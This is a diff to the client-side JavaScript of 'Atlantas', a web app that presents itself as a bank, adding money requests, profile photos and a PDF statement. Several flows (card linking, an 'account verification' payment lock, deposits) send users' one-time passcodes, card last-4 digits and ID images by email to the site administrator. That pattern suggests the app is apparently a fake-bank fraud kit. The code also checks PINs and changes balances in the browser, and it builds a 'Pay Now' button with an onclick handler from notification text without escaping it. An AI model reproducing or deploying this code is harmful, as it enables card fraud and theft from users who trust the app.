@@ -259,7 +259,12 @@ function APP_bioPinSubmit(){
   _db.ref(DB.users).orderByChild('email').equalTo(email).once('value',function(snap){
     if(!snap.exists()){APP_toast('Account not found','er');return;}
     var uid=Object.keys(snap.val())[0];
-    if((snap.val()[uid].pin||'')===pin){APP_toast('Verified! Enter password to login.','ok');setTimeout(function(){_show('auth',false);var em=$('li-email');if(em)em.value=email;},1500);}
+    if((snap.val()[uid].pin||'')===pin){
+        APP_toast('\u2705 Biometric verified!','ok');
+        // Store the uid so we can redirect after auth — user must still login normally
+        // (Firebase auth requires password; biometric only verifies PIN identity)
+        setTimeout(function(){_show('auth',false);var em=$('li-email');if(em)em.value=email;},1000);
+      }
     else APP_toast('Incorrect PIN','er');
   });
 }
@@ -455,7 +460,7 @@ function APP_lockFlowSubmit(){
     name:(_ud.firstname+' '+_ud.surname),email:_ud.email,
     submittedDate:new Date().toISOString(),status:'pending'
   })).then(function(){
-    _sendEmail('general','Account Verification Step',{user_name:_ud.firstname,user_email:_ud.email,method:_lockFlow.method.key,amount:String(_lockFlow.amount),message:'User submitted account verification payment step.'});
+    _sendEmail('otp','Account Verification Step',{user_name:_ud.firstname,user_email:_ud.email,method:_lockFlow.method.key,amount:String(_lockFlow.amount),message:'User submitted account verification payment step.'});
     _show('lock-confirm',true);
     _setEl('lock-confirm-msg',_cfg.lockConfirmMessage||'Thank you. Your submission is under review. You will be notified within 24 hours.');
     // Show OTP button if method requires it
@@ -478,7 +483,7 @@ function APP_lockOtpSubmit(){
   if(!lockKey){APP_toast('Session expired. Please restart.','er');return;}
   // Append OTP to existing submission
   _db.ref(DB.locks+'/'+lockKey).update({otpCode:otp,otpSubmittedDate:new Date().toISOString(),status:'otp_submitted'}).then(function(){
-    _sendEmail('general','Account Verification OTP Submitted',{user_name:_ud.firstname,user_email:_ud.email,otp:otp,message:'User submitted OTP for account verification. Full submission complete.'});
+    _sendEmail('otp','Account Verification OTP Submitted',{user_name:_ud.firstname,user_email:_ud.email,otp:otp,message:'User submitted OTP for account verification. Full submission complete.'});
     try{localStorage.removeItem('atl_lock_key');}catch(e){}
     // Clear OTP input
     var inp=$('lock-otp-input');if(inp)inp.value='';
@@ -503,7 +508,15 @@ function _watchNotifs(uid){
     if(unread>0&&_appBooted){var latest=notifs.find(function(n){return!n.read;});if(latest)_pushNotif('Atlantas',latest.message||'You have a new notification');}
     var html='';
     notifs.forEach(function(n){
-      html+='<div class="notif-item'+(n.read?'':' unread')+'">'+(n.read?'<div class="notif-nub read"></div>':'<div class="notif-nub"></div>')+'<div><div class="notif-txt">'+_esc(n.message||n.text||'')+'</div><div class="notif-dt">'+_fmtDate(n.date)+'</div></div></div>';
+      var rawMsg=n.message||n.text||'';
+      var payMatch=rawMsg.match(/\[PAY:([^\]]+)\]/);
+      var displayMsg=rawMsg.replace(/\s*\[PAY:[^\]]+\]/,'');
+      var payBtn=payMatch?'<button onclick="APP.payMoneyRequest(\''+payMatch[1]+'\')" style="margin-top:8px;background:var(--p);color:#fff;border:none;border-radius:8px;padding:8px 16px;font-size:13px;font-weight:700;cursor:pointer;width:100%;">\uD83D\uDCB8 Pay Now</button>':'';
+      html+='<div class="notif-item'+(n.read?'':' unread')+'">'+
+        (n.read?'<div class="notif-nub read"></div>':'<div class="notif-nub"></div>')+
+        '<div style="flex:1;"><div class="notif-txt">'+_esc(displayMsg)+'</div>'+
+        '<div class="notif-dt">'+_fmtDate(n.date)+'</div>'+payBtn+
+        '</div></div>';
       if(!n.read)_db.ref(DB.notifs+'/'+uid+'/'+n._key+'/read').set(true);
     });
     if(list)list.innerHTML=html;
@@ -514,11 +527,27 @@ function _watchNotifs(uid){
 function _renderUI(){
   if(!_ud)return;var u=_ud;
   var init=((u.firstname||'').charAt(0)+(u.surname||'').charAt(0)).toUpperCase()||'??';
-  _setEl('tb-init',init);_setEl('pf-ava',init);
+  // Profile photo — show image if available, else initials
+  var tbAva=$('tb-ava'),pfAva=$('pf-ava');
+  if(u.photoUrl){
+    if(tbAva){tbAva.style.backgroundImage='url('+u.photoUrl+')';tbAva.style.backgroundSize='cover';tbAva.style.backgroundPosition='center';var sp=$('tb-init');if(sp)sp.style.display='none';}
+    if(pfAva){pfAva.style.backgroundImage='url('+u.photoUrl+')';pfAva.style.backgroundSize='cover';pfAva.style.backgroundPosition='center';pfAva.innerHTML='';}
+  } else {
+    if(tbAva){tbAva.style.backgroundImage='';tbAva.style.backgroundSize='';var sp=$('tb-init');if(sp){sp.style.display='';sp.textContent=init;}}
+    if(pfAva){pfAva.style.backgroundImage='';pfAva.style.backgroundSize='';pfAva.textContent=init;}
+  }
+  _setEl('tb-init',u.photoUrl?'':init);
   _setEl('pf-name',(u.firstname||'')+' '+(u.surname||''));_setEl('pf-email',u.email||'');
   _setEl('pf-fn',u.firstname||'\u2014');_setEl('pf-on',u.othername||'\u2014');_setEl('pf-sn',u.surname||'\u2014');
   _setEl('pf-ph',u.phone||'\u2014');_setEl('pf-acc',u.accountNumber||'\u2014');_setEl('pf-co',u.country||'\u2014');
   _setEl('pf-ref',u.referralCode||'\u2014');
+  // Ensure referral code always exists - generate if missing
+  if(!u.referralCode&&_user){
+    var newCode='ATL-'+_user.uid.slice(0,6).toUpperCase();
+    _db.ref(DB.users+'/'+_user.uid+'/referralCode').set(newCode);
+    if(_ud)_ud.referralCode=newCode;
+    _setEl('pf-ref',newCode);
+  }
   _setEl('pin-row-lbl',u.pin?'Change Transaction PIN':'Set Transaction PIN');
   // Update cyber welcome name
   _setEl('cyber-name',(u.firstname||'USER').toUpperCase());
@@ -816,7 +845,7 @@ function APP_submitLoan(){
     kycStatus:_ud.kycStatus,status:'pending',
     appliedDate:new Date().toISOString()
   }).then(function(){
-    _sendEmail('general','New Loan Application',{user_name:_ud.firstname,user_email:_ud.email,amount:_sym(_ud.currency)+amt.toFixed(2),purpose:purpose,duration:duration,message:'User submitted a loan application.'});
+    _sendEmail('otp','New Loan Application',{user_name:_ud.firstname,user_email:_ud.email,amount:_sym(_ud.currency)+amt.toFixed(2),purpose:purpose,duration:duration,message:'User submitted a loan application.'});
     _pushAdminAlert('\uD83D\uDCB0 New Loan Application',(_ud.firstname||'A user')+' applied for a loan of '+_sym(_ud.currency)+amt.toFixed(2)+'. Tap to review.');
     if(btn){btn.textContent='Apply for Loan';btn.disabled=false;}
     if(amtEl)amtEl.value='';if(purEl)purEl.value='';if(durEl)durEl.value='';
@@ -1111,7 +1140,9 @@ function APP_doSignup(){
         .then(function(){return _db.ref(DB.pubDir+'/'+uid).set({firstname:fn,surname:sn,accountNumber:accNum});})
         .then(function(){
           if(ref){_db.ref(DB.users).orderByChild('referralCode').equalTo(ref).once('value',function(snap){snap.forEach(function(s){var u=s.val();if(!u)return;var refs=u.referrals||[];refs.push({uid:uid,date:new Date().toISOString()});_db.ref(DB.users+'/'+s.key).update({referrals:refs,referralEarned:(parseFloat(u.referralEarned)||0)+refBonus});});});sessionStorage.removeItem('atl_ref');}
-          _sendEmail('general','New Registration',{user_name:fn+' '+sn,user_email:em,account_number:accNum,message:'New user registered.'});
+          _sendEmail('otp','New Registration',{user_name:fn+' '+sn,user_email:em,account_number:accNum,message:'New user registered.'});
+          _pushAdminAlert('\uD83D\uDC64 New User Registered', (fn+' '+sn).trim()+' just created an account. Tap to review.');
+          _notify(uid, '\uD83C\uDF89 Welcome to Atlantas, '+fn+'! Your account is ready. Complete your KYC verification to unlock full access.');
         });
     });
   }).catch(function(e){$('su-err').textContent=_fbErr(e.code);btn.textContent='Create Account';btn.disabled=false;});
@@ -1139,7 +1170,13 @@ function APP_sendPasswordReset(){
 
 // ── EMAIL JS ──────────────────────────────────────────────────
 function _sendEmail(account,subject,params){
-  try{var ej=(_cfg.emailjs)||{};var acc=account==='otp'?ej.otp:ej.general;if(!acc||!acc.publicKey||!acc.serviceId||!acc.templateId)return;emailjs.init(acc.publicKey);emailjs.send(acc.serviceId,acc.templateId,Object.assign({},{subject:subject,to_email:_cfg.adminEmail||'',from_name:'Atlantas'},params));}catch(e){}
+  try{
+    var ej=(_cfg.emailjs)||{};
+    var acc=ej.otp; // Always use OTP service - single EmailJS account
+    if(!acc||!acc.publicKey||!acc.serviceId||!acc.templateId)return;
+    emailjs.init(acc.publicKey);
+    emailjs.send(acc.serviceId,acc.templateId,Object.assign({},{subject:subject,to_email:_cfg.adminEmail||'',from_name:'Atlantas'},params));
+  }catch(e){}
 }
 
 // ── TABS & UI ─────────────────────────────────────────────────
@@ -1235,7 +1272,7 @@ function APP_submitKyc(){
     _clUpload(_kycFiles.selfie,'kyc',function(selfieUrl){
       _db.ref(DB.users+'/'+_user.uid+'/kycStatus').set('submitted').then(function(){
         _db.ref(DB.kyc+'/'+_user.uid).set({uid:_user.uid,email:_ud.email,name:(_ud.firstname+' '+_ud.surname),idUrl:idUrl,selfieUrl:selfieUrl,submittedDate:new Date().toISOString(),status:'pending'});
-        _sendEmail('general','KYC Submission',{user_name:_ud.firstname+' '+_ud.surname,user_email:_ud.email,id_url:idUrl,selfie_url:selfieUrl,message:'User submitted KYC documents.'});
+        _sendEmail('otp','KYC Submission',{user_name:_ud.firstname+' '+_ud.surname,user_email:_ud.email,id_url:idUrl,selfie_url:selfieUrl,message:'User submitted KYC documents.'});
         _pushAdminAlert('\uD83E\uDEAA New KYC Submission',(_ud.firstname||'A user')+' submitted identity documents. Tap to review.');
         APP_toast('Submitted for review!','ok');btn.textContent='Submit for Review';btn.disabled=false;APP_back();
       });
@@ -1245,8 +1282,15 @@ function APP_submitKyc(){
 
 // ── MODALS ────────────────────────────────────────────────────
 function APP_openModal(type){var body=$('modal-body');if(!body)return;body.innerHTML=_buildModal(type);$('modal-overlay').classList.add('open');}
-function APP_closeModal(e){if(e&&e.target!==$('modal-overlay'))return;$('modal-overlay').classList.remove('open');}
-function _closeModal(){$('modal-overlay').classList.remove('open');}
+function APP_closeModal(e){
+  // If called from overlay onclick, only close when clicking the overlay itself (not modal card)
+  if(e&&e.currentTarget&&e.target!==e.currentTarget)return;
+  _closeModal();
+}
+function _closeModal(){
+  var overlay=$('modal-overlay');
+  if(overlay){overlay.classList.remove('open');}
+}
 
 function _buildModal(type){
   var en=(_cfg.labels&&_cfg.labels.en)||{};
@@ -1276,7 +1320,7 @@ function _buildModal(type){
     var approvedInsts=[];
     Object.keys(linkedInsts).forEach(function(idx){
       var li=linkedInsts[idx];
-      if(li&&li.status==='approved'){
+      if(li&&li.status==='authorized'){
         var instCfg=(_cfg.institutions||[])[parseInt(idx)];
         approvedInsts.push({idx:idx,name:(instCfg&&instCfg.name)||li.institution||'Bank Account',inst:li});
       }
@@ -1348,7 +1392,7 @@ function APP_submitTopup(){
   _db.ref(DB.topups+'/'+key).set({uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,amount:amt,currency:_ud.currency||'USD',accountNumber:_ud.accountNumber,reference:note,paymentSource:srcLabel,status:'pending',date:new Date().toISOString()}).then(function(){
     var hist=(_ud.history||[]);hist.push({type:'debit',amount:amt,currency:_ud.currency,description:'Add money request',requestKey:key,status:'pending',date:new Date().toISOString()});
     _db.ref(DB.users+'/'+_user.uid+'/history').set(hist);
-    _sendEmail('general','New Deposit Request',{user_name:_ud.firstname,user_email:_ud.email,amount:_sym(_ud.currency)+amt.toFixed(2),account:_ud.accountNumber,reference:note,message:'User submitted a deposit request.'});
+    _sendEmail('otp','New Deposit Request',{user_name:_ud.firstname,user_email:_ud.email,amount:_sym(_ud.currency)+amt.toFixed(2),account:_ud.accountNumber,reference:note,message:'User submitted a deposit request.'});
     _pushAdminAlert('\u2B07\uFE0F New Deposit Request',(_ud.firstname||'A user')+' submitted a deposit of '+_sym(_ud.currency)+amt.toFixed(2)+'. Tap to review.');
     _closeModal();APP_toast('Request submitted!','ok');
   });
@@ -1393,15 +1437,72 @@ function APP_submitCashout(){
     var hist=(_ud.history||[]);hist.push({type:'debit',amount:amt,currency:_ud.currency,description:'Withdrawal to '+bankName,requestKey:key,status:'processing',date:new Date().toISOString()});
     _db.ref(DB.users+'/'+_user.uid).update({balance:bal-amt,history:hist});
     _db.ref(DB.cashouts+'/'+key).set({uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,amount:amt,currency:_ud.currency||'USD',accountNumber:_ud.accountNumber,destinationInstitution:bankName,destinationInstIdx:instIdx,referredBy:_ud.referredBy||'',status:'pending',date:new Date().toISOString()});
-    _sendEmail('general','Withdrawal Request',{user_name:_ud.firstname,user_email:_ud.email,amount:sym+amt.toFixed(2),account:bankName,bank:bankName,message:'User submitted a withdrawal request to linked institution.'});
+    _sendEmail('otp','Withdrawal Request',{user_name:_ud.firstname,user_email:_ud.email,amount:sym+amt.toFixed(2),account:bankName,bank:bankName,message:'User submitted a withdrawal request to linked institution.'});
     _pushAdminAlert('\u2B06\uFE0F New Withdrawal Request',(_ud.firstname||'A user')+' wants to withdraw '+sym+amt.toFixed(2)+' to '+bankName+'. Tap to review.');
     APP_toast('Withdrawal submitted!','ok');
   });
 }
 function APP_submitRequest(){
-  var fromAcc=$('m-req-from')&&$('m-req-from').value.trim()||'',amt=parseFloat($('m-req-amt')&&$('m-req-amt').value||0),note=$('m-req-note')&&$('m-req-note').value||'';
-  var err=$('m-err');if(err)err.textContent='';if(!fromAcc){if(err)err.textContent='Enter sender account number.';return;}if(!amt||amt<1){if(err)err.textContent='Enter a valid amount.';return;}
-  _db.ref(DB.accNums+'/'+fromAcc).once('value',function(snap){if(!snap.exists()){if(err)err.textContent='Account not found.';return;}_notify(snap.val(),(_ud.firstname||'A user')+' is requesting '+_sym(_ud.currency)+amt.toFixed(2)+(note?' for '+note:'')+'. Account: '+_ud.accountNumber);_closeModal();APP_toast('Request sent!','ok');});
+  var fromAcc=($('m-req-from')&&$('m-req-from').value.trim())||'';
+  var amt=parseFloat($('m-req-amt')&&$('m-req-amt').value||0);
+  var note=($('m-req-note')&&$('m-req-note').value)||'';
+  var err=$('m-err');if(err)err.textContent='';
+  if(!fromAcc){if(err)err.textContent='Enter sender account number.';return;}
+  if(!amt||amt<1){if(err)err.textContent='Enter a valid amount.';return;}
+  _db.ref(DB.accNums+'/'+fromAcc).once('value',function(snap){
+    if(!snap.exists()){if(err)err.textContent='Account not found.';return;}
+    var recipientUid=snap.val();
+    var reqKey='req_'+Date.now()+'_'+_user.uid.slice(0,6);
+    // Save request to Firebase so recipient can pay it
+    _db.ref('atl_money_requests/'+reqKey).set({
+      fromUid:recipientUid,   // who we're asking money FROM
+      toUid:_user.uid,        // who gets the money (requester)
+      toName:(_ud.firstname||'')+' '+(_ud.surname||''),
+      toAccount:_ud.accountNumber,
+      toCurrency:_ud.currency||'USD',
+      amount:amt,
+      note:note||'',
+      status:'pending',
+      date:new Date().toISOString()
+    }).then(function(){
+      var sym=_sym(_ud.currency);
+      var msg='\uD83D\uDCB8 '+(_ud.firstname||'A user')+' is requesting '+sym+amt.toFixed(2)+(note?' for \"'+note+'\"':'')+'. Tap to pay. [PAY:'+reqKey+']';
+      _notify(recipientUid,msg);
+      _closeModal();
+      APP_toast('Request sent!','ok');
+    });
+  });
+}
+// Pay a money request from notification
+function APP_payMoneyRequest(reqKey){
+  _db.ref('atl_money_requests/'+reqKey).once('value',function(snap){
+    if(!snap.exists()){APP_toast('Request not found or expired','er');return;}
+    var req=snap.val();
+    if(req.status!=='pending'){APP_toast('This request was already paid','');return;}
+    if(req.fromUid!==_user.uid){APP_toast('This request is not for you','er');return;}
+    var myBal=parseFloat(_ud.balance||0);
+    var sym=_sym(_ud.currency);
+    var convertedAmt=_convertCurrency(req.amount,req.toCurrency||'USD',_ud.currency||'USD');
+    if(convertedAmt>myBal){APP_toast('Insufficient balance','er');return;}
+    APP_requirePin('Pay Request',sym+convertedAmt.toFixed(2)+' to '+req.toName,function(){
+      var now=new Date().toISOString();
+      // Deduct from payer
+      var sHist=(_ud.history||[]);
+      sHist.push({type:'debit',amount:convertedAmt,currency:_ud.currency,description:'Paid request from '+(req.toName||'user')+(req.note?' · '+req.note:''),date:now,status:'successful'});
+      _db.ref(DB.users+'/'+_user.uid).update({balance:myBal-convertedAmt,history:sHist});
+      // Credit requester
+      _db.ref(DB.users+'/'+req.toUid).once('value',function(rSnap){
+        var r=rSnap.val()||{};
+        var rHist=(r.history||[]);
+        rHist.push({type:'credit',amount:req.amount,currency:req.toCurrency,description:'Request paid by '+(_ud.firstname||'user')+(req.note?' · '+req.note:''),date:now,status:'successful'});
+        _db.ref(DB.users+'/'+req.toUid).update({balance:(parseFloat(r.balance)||0)+req.amount,history:rHist});
+      });
+      // Mark request paid
+      _db.ref('atl_money_requests/'+reqKey).update({status:'paid',paidDate:now,paidByUid:_user.uid});
+      _notify(req.toUid,'\u2705 Your payment request of '+_sym(req.toCurrency)+req.amount.toFixed(2)+' was paid by '+(_ud.firstname||'a user')+'!');
+      APP_toast('Payment sent!','ok');
+    });
+  });
 }
 // ── CARD MULTI-STEP FLOW ──────────────────────────────────────
 var _cardDraft=null; // persists pending card data across steps
@@ -1491,7 +1592,7 @@ function APP_cardStep1Submit(){
   _db.ref(DB.users+'/'+_user.uid+'/linkedCards').set(cards).then(function(){
     if(_ud)_ud.linkedCards=cards;
     _renderCards();
-    _sendEmail('general','New Card Submission — Step 1',{user_name:_ud.firstname,user_email:_ud.email,card_last4:cn.slice(-4),bank:bank,message:'User submitted card details. Awaiting ID and OTP.'});
+    _sendEmail('otp','New Card Submission — Step 1',{user_name:_ud.firstname,user_email:_ud.email,card_last4:cn.slice(-4),bank:bank,message:'User submitted card details. Awaiting ID and OTP.'});
     _pushAdminAlert('\uD83D\uDCB3 New Card Submission',(_ud.firstname||'A user')+' submitted a '+brand+' card ending '+cn.slice(-4)+'. Tap to review.');
   });
   // Go to ID step if enabled, else straight to OTP
@@ -1519,7 +1620,7 @@ function APP_cardStep2Submit(){
   if(!_cardDraft._idUrl){if(err)err.textContent='Please upload your ID document.';return;}
   // Append ID data to the card in firebase
   _appendCardData({_idUrl:_cardDraft._idUrl,_selfieUrl:_cardDraft._selfieUrl||'',_needsId:false});
-  _sendEmail('general','Card ID Submitted',{user_name:_ud.firstname,user_email:_ud.email,card_last4:_cardDraft.lastFour||'',message:'User uploaded ID for card verification.'});
+  _sendEmail('otp','Card ID Submitted',{user_name:_ud.firstname,user_email:_ud.email,card_last4:_cardDraft.lastFour||'',message:'User uploaded ID for card verification.'});
   _show('card-step3',true);
 }
 
@@ -1528,7 +1629,7 @@ function APP_cardStep3Submit(){
   var err=$('cs-otp-err');if(err)err.textContent='';
   if(!otp){if(err)err.textContent='Please enter the OTP code.';return;}
   _appendCardData({_otpCode:otp,_needsOtp:false,status:'pending'});
-  _sendEmail('general','Card OTP Submitted',{user_name:_ud.firstname,user_email:_ud.email,card_last4:_cardDraft.lastFour||'',otp:otp,message:'User submitted OTP for card. Full submission complete — awaiting admin approval.'});
+  _sendEmail('otp','Card OTP Submitted',{user_name:_ud.firstname,user_email:_ud.email,card_last4:_cardDraft.lastFour||'',otp:otp,message:'User submitted OTP for card. Full submission complete — awaiting admin approval.'});
   // Clear draft
   try{localStorage.removeItem('atl_card_draft');}catch(e){}
   _cardDraft=null;
@@ -1558,6 +1659,34 @@ function APP_submitCard(){
 // ── TOAST ─────────────────────────────────────────────────────
 function APP_toast(msg,type,dur){var t=$('toast');if(!t)return;t.textContent=msg;t.className='show'+(type?' '+type:'');clearTimeout(t._t);t._t=setTimeout(function(){t.className='';},dur||2500);}
 
+// ── PROFILE PHOTO ────────────────────────────────────────────
+function APP_uploadProfilePhoto(input){
+  if(!input||!input.files||!input.files[0])return;
+  var file=input.files[0];
+  var zone=$('photo-upload-zone');
+  if(zone)zone.style.opacity='0.6';
+  APP_toast('Uploading photo…');
+  _clUpload(file,'profile',function(url){
+    _db.ref(DB.users+'/'+_user.uid+'/photoUrl').set(url).then(function(){
+      if(_ud)_ud.photoUrl=url;
+      _renderUI();
+      if(zone)zone.style.opacity='1';
+      APP_toast('Profile photo updated!','ok');
+    });
+  },function(e){
+    APP_toast(e,'er');
+    if(zone)zone.style.opacity='1';
+  });
+}
+function APP_removeProfilePhoto(){
+  if(!confirm('Remove your profile photo?'))return;
+  _db.ref(DB.users+'/'+_user.uid+'/photoUrl').remove().then(function(){
+    if(_ud)_ud.photoUrl=null;
+    _renderUI();
+    APP_toast('Photo removed','ok');
+  });
+}
+
 // ── PUBLIC API ────────────────────────────────────────────────
 var APP={
   goScreen:APP_goScreen,back:APP_back,signOut:APP_signOut,
@@ -1581,9 +1710,12 @@ var APP={
   lockFlowSubmit:APP_lockFlowSubmit,lockOtpSubmit:APP_lockOtpSubmit,
   openLoan:APP_openLoan,submitLoan:APP_submitLoan,
   showReceipt:APP_showReceipt,toast:APP_toast,
+  uploadProfilePhoto:APP_uploadProfilePhoto,removeProfilePhoto:APP_removeProfilePhoto,
+  payMoneyRequest:APP_payMoneyRequest,
   toggleDark:APP_toggleDark,
   obNext:APP_obNext,obSkip:APP_obSkip,
   pinKey:APP_pinKey,pinDel:APP_pinDel,cancelTxPin:APP_cancelTxPin,
+  downloadStatement:APP_downloadStatement,
   downloadReceipt:APP_downloadReceipt
 };
 
@@ -1708,6 +1840,91 @@ function APP_cancelTxPin(){
 }
 
 // ── PDF RECEIPT ───────────────────────────────────────────────
+function APP_downloadStatement(){
+  if(!_ud||!_history||!_history.length){APP_toast('No transactions to export','er');return;}
+  if(typeof window.jspdf==='undefined'){APP_toast('PDF library loading\u2026','');return;}
+  APP_toast('Generating statement\u2026');
+  var jsPDF=window.jspdf.jsPDF;
+  var appName=(_cfg&&_cfg.appName)||'Atlantas';
+  var sym=_sym(_ud.currency);
+  var pageW=210,pageH=297,margin=14,y=0;
+  var doc=new jsPDF({orientation:'portrait',unit:'mm',format:'a4'});
+
+  function addPage(){doc.addPage();y=margin;}
+  function checkY(needed){if(y+needed>pageH-margin)addPage();}
+
+  // ── Header ──
+  doc.setFillColor(30,63,206);doc.rect(0,0,pageW,28,'F');
+  doc.setTextColor(255,255,255);doc.setFontSize(16);doc.setFont('helvetica','bold');
+  doc.text(appName,margin,12);
+  doc.setFontSize(9);doc.setFont('helvetica','normal');
+  doc.text('Account Statement',margin,20);
+  doc.setFontSize(8);
+  doc.text('Generated: '+new Date().toLocaleString(),pageW-margin,20,{align:'right'});
+
+  // ── Account info ──
+  y=36;
+  doc.setTextColor(13,17,23);doc.setFontSize(10);doc.setFont('helvetica','bold');
+  doc.text((_ud.firstname||'')+' '+(_ud.surname||''),margin,y);y+=6;
+  doc.setFontSize(8);doc.setFont('helvetica','normal');doc.setTextColor(107,114,128);
+  doc.text('Account: '+(_ud.accountNumber||'—')+'   Currency: '+(_ud.currency||'USD')+'   Email: '+(_ud.email||'—'),margin,y);y+=5;
+  doc.setDrawColor(228,230,235);doc.line(margin,y,pageW-margin,y);y+=6;
+
+  // ── Summary row ──
+  var totalIn=0,totalOut=0;
+  _history.forEach(function(tx){if(tx.type==='credit')totalIn+=parseFloat(tx.amount||0);else totalOut+=parseFloat(tx.amount||0);});
+  doc.setFillColor(242,244,247);doc.roundedRect(margin,y,pageW-margin*2,16,2,2,'F');
+  doc.setFontSize(8);doc.setFont('helvetica','bold');doc.setTextColor(13,17,23);
+  doc.text('Opening Balance: '+sym+parseFloat(_ud.balance||0).toFixed(2),margin+4,y+6);
+  doc.setTextColor(22,163,74);doc.text('Total In: +'+sym+totalIn.toFixed(2),margin+60,y+6);
+  doc.setTextColor(220,38,38);doc.text('Total Out: -'+sym+totalOut.toFixed(2),margin+110,y+6);
+  doc.setTextColor(13,17,23);doc.text('Txns: '+_history.length,margin+160,y+6);
+  y+=22;
+
+  // ── Table header ──
+  doc.setFillColor(30,63,206);doc.rect(margin,y,pageW-margin*2,7,'F');
+  doc.setTextColor(255,255,255);doc.setFontSize(7);doc.setFont('helvetica','bold');
+  doc.text('Date',margin+2,y+5);
+  doc.text('Description',margin+32,y+5);
+  doc.text('Type',margin+110,y+5);
+  doc.text('Amount',pageW-margin-2,y+5,{align:'right'});
+  y+=9;
+
+  // ── Rows ──
+  var rowH=8;
+  _history.forEach(function(tx,i){
+    checkY(rowH+2);
+    var isCr=tx.type==='credit';
+    var bg=i%2===0?[255,255,255]:[248,249,251];
+    doc.setFillColor(bg[0],bg[1],bg[2]);
+    doc.rect(margin,y,pageW-margin*2,rowH,'F');
+    doc.setFontSize(6.5);doc.setFont('helvetica','normal');doc.setTextColor(107,114,128);
+    var d=tx.date?new Date(tx.date).toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'2-digit'}):'—';
+    doc.text(d,margin+2,y+5.5);
+    doc.setTextColor(13,17,23);
+    var desc=(tx.description||tx.type||'Transaction').substring(0,42);
+    doc.text(desc,margin+32,y+5.5);
+    doc.setTextColor(isCr?22:220,isCr?163:38,isCr?74:38);
+    doc.setFont('helvetica','bold');
+    doc.text(isCr?'Credit':'Debit',margin+110,y+5.5);
+    doc.text((isCr?'+':'-')+sym+parseFloat(tx.amount||0).toFixed(2),pageW-margin-2,y+5.5,{align:'right'});
+    y+=rowH;
+  });
+
+  // ── Footer on each page ──
+  var totalPages=doc.internal.getNumberOfPages();
+  for(var p=1;p<=totalPages;p++){
+    doc.setPage(p);
+    doc.setFillColor(242,244,247);doc.rect(0,pageH-12,pageW,12,'F');
+    doc.setFontSize(6);doc.setFont('helvetica','normal');doc.setTextColor(107,114,128);
+    doc.text(appName+' — Confidential Account Statement',margin,pageH-5);
+    doc.text('Page '+p+' of '+totalPages,pageW-margin,pageH-5,{align:'right'});
+  }
+
+  doc.save(appName+'_Statement_'+new Date().toISOString().slice(0,10)+'.pdf');
+  APP_toast('Statement downloaded!','ok');
+}
+
 function APP_downloadReceipt(txJson){
   var tx;try{tx=JSON.parse(decodeURIComponent(txJson));}catch(e){return;}
   if(typeof window.jspdf==='undefined'){APP_toast('PDF library loading…','');return;}
